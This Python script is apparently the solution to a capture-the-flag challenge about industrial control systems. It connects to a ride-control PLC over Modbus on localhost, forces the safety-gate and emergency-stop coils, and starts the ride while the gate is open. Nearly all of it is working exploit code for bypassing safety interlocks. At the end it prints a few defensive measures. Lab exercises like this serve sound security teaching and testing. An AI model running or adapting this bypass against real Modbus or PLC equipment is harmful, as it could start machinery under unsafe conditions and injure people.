#!/usr/bin/env python3
"""
CTF Challenge 5: Safety Bypass (Hard - 350 points)
Make the ride start despite safety_gate_closed being false

Method: Force safety signals and send start command
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def main():
    print("="*60)
    print("CTF Challenge 5: Safety Bypass")
    print("="*60)
    print()
    print("⚠️  WARNING: Critical safety vulnerability demonstration")
    print()
    print("Objective: Start ride with safety gate open")
    print("Method: Bypass safety interlocks via Modbus manipulation")
    print()

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

    try:
        if not client.connect():
            print(f"❌ Failed to connect to PLC at {PLC_HOST}:{PLC_PORT}")
            return

        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")

        print("\n[Phase 1] Reading safety status...")
        result = client.read_coils(0, 5, unit=1)

        if not result.isError():
            coils = result.bits[:5]
            master_enable = coils[0]
            start_command = coils[1]
            emergency_stop = coils[3]
            safety_gate = coils[4]

            print(f"  Master Enable: {master_enable}")
            print(f"  Emergency Stop: {emergency_stop}")
            print(f"  Safety Gate Closed: {safety_gate}")

            if not safety_gate:
                print("\n⚠️  Safety gate is OPEN - bypassing interlock...")

        print("\n[Phase 2] Forcing all safety conditions...")
        print("  Step 1: Forcing safety_gate_closed = TRUE")
        client.write_coil(4, True, unit=1)
        time.sleep(0.2)

        print("  Step 2: Ensuring master_enable = TRUE")
        client.write_coil(0, True, unit=1)
        time.sleep(0.2)

        print("  Step 3: Ensuring emergency_stop = FALSE")
        client.write_coil(3, False, unit=1)
        time.sleep(0.2)

        print("  ✓ All safety interlocks bypassed")

        print("\n[Phase 3] Sending start command...")
        client.write_coil(1, True, unit=1)
        time.sleep(1)

        # Release start button
        client.write_coil(1, False, unit=1)
        print("  ✓ Start command sent")

        print("\n[Phase 4] Checking ride state...")
        time.sleep(1)
        result = client.read_holding_registers(1024 + 15, 1, unit=1)

        if not result.isError():
            state = result.registers[0]
            state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
            state_name = state_names[state] if state < len(state_names) else 'Unknown'

            print(f"  PLC State: {state} ({state_name})")

            if state >= 1:
                print("\n🎯 SUCCESS! Safety bypass completed")
                print("   Ride started despite safety gate being physically open")
                print("   This represents a CRITICAL safety vulnerability")
            else:
                print("\n⚠️  Ride did not start - state still Idle")

        print("\n[Phase 5] Stopping ride safely...")
        client.write_coil(2, True, unit=1)
        time.sleep(1)
        client.write_coil(2, False, unit=1)
        print("  ✓ Stop command sent")

        print("\n[Defensive Measures]")
        print("  1. Implement physical safety relays independent of PLC")
        print("  2. Use cryptographic signing for safety-critical signals")
        print("  3. Employ safety-rated PLCs with certified logic")
        print("  4. Monitor for anomalous signal patterns")
        print("  5. Implement network segmentation and authentication")

    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        client.close()

if __name__ == '__main__':
    main()
